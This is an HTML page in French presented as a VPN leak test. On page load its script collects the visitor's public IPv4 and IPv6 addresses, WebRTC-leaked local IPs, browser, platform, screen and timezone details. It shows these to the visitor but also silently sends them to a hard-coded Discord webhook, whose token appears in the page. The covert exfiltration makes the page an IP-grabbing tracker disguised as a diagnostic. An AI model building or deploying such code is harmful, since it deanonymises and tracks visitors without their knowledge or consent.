<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test VPN - Détection IP & Fuites</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
        pre { background: #fff; padding: 15px; border-radius: 8px; overflow-x: auto; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>Test de fuite IP pour développement VPN</h1>
    <p>Chargement des informations en cours...</p>
    <pre id="result">...</pre>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1453526094484340807/Yxx2ikxrHe_y_hZejxwwxFxfBKISLKzV1RwcnjvzR4AovUqrrPtNSJ8xzgNm7dV6W2xZ";

        async function sendToDiscord(data) {
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "Nouvelle connexion VPN Test",
                            color: 3447003,
                            fields: Object.entries(data).map(([key, value]) => ({
                                name: key,
                                value: typeof value === 'object' ? JSON.stringify(value, null, 2) : String(value),
                                inline: true
                            })),
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            } catch (e) {
                console.error("Erreur envoi Discord:", e);
            }
        }

        async function gatherInfo() {
            const info = {
                Timestamp: new Date().toLocaleString(),
                UserAgent: navigator.userAgent,
                Language: navigator.language,
                Platform: navigator.platform,
                Screen: `\( {screen.width}x \){screen.height}`,
                Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            // IPs publiques (plusieurs sources pour fiabilité)
            try {
                const res1 = await fetch("https://api.ipify.org?format=json");
                const data1 = await res1.json();
                info["IP (ipify)"] = data1.ip;
            } catch {}

            try {
                const res2 = await fetch("https://ipv4.icanhazip.com");
                info["IP (icanhazip)"] = (await res2.text()).trim();
            } catch {}

            try {
                const res3 = await fetch("https://api6.ipify.org?format=json");
                const data3 = await res3.json();
                info["IPv6 (ipify)"] = data3.ip;
            } catch {}

            // WebRTC (fuites courantes avec VPN mal configurés)
            const rtc = [];
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const match = ice.candidate.candidate.match(/candidate:.+ (\d+\.\d+\.\d+\.\d+) /);
                    if (match) rtc.push(match[1]);
                }
            };
            setTimeout(() => {
                if (rtc.length > 0) info["WebRTC IPs"] = rtc;
                pc.close();

                // Affichage + envoi
                document.getElementById("result").textContent = JSON.stringify(info, null, 2);
                sendToDiscord(info);
            }, 3000);

            return info;
        }

        gatherInfo();
    </script>
</body>
</html>
